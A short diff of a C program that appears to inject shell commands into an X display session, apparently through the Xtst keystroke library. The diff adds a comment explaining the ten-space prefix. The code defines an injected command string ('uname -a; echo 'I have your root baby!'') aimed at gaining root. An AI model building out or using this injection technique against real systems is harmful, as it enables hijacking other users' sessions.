@@ -57,6 +57,7 @@ void erase(unsigned times, unsigned delay)
 int main(int argc, char **argv)
 {
 // use ten blank spaces and append with command CMD that you need to inject
+// why ten blank space ? have dragons in lib Xtst, its crazy 	
 	char *CMD="          uname -a; echo 'I have your root baby!'";
 		if((display=XOpenDisplay(NULL)) == NULL) 
 		{
